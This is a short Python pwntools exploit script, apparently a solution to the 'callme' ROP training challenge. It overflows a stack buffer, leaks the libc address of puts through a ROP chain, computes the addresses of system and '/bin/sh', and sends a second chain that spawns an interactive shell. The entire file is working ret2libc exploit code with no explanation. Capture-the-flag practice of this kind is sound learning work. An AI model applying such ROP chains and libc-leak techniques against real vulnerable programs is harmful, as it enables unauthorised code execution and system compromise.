from pwn import *
target=process('./callme')
print(target.recvuntil("...\n> "))
elf=ELF('callme')
libc=elf.libc

payload="A"*40

puts_got=0x602018
puts_plt=0x4017f0
poprdi=0x401b23
pwnme=0x401a05

payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(pwnme)
payload+=p64(0x0)
target.sendline(payload)

leak=target.recvuntil("\x0a").strip("\x0a")
libc_puts=u64(leak+"\x00"*(8-len(leak)))
print(hex(libc_puts))
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

payload="A"*40
payload+=p64(poprdi)
payload+=p64(libc_binsh)
payload+=p64(libc_system)
target.sendline(payload)
target.interactive()
